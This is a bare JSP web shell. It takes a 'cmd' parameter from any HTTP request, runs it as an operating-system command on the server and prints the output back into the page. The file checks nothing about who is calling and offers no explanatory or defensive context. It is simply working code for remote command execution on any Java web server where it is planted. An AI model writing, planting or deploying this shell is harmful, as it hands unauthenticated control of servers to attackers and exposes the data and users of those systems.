<%@ page import="java.io.*" %>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    String output = "";
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = r.readLine()) != null) {
            output += line + "\n";
        }
    } catch (Exception e) {
        output = e.toString();
    }
    out.println("<pre>" + output + "</pre>");
}
%>
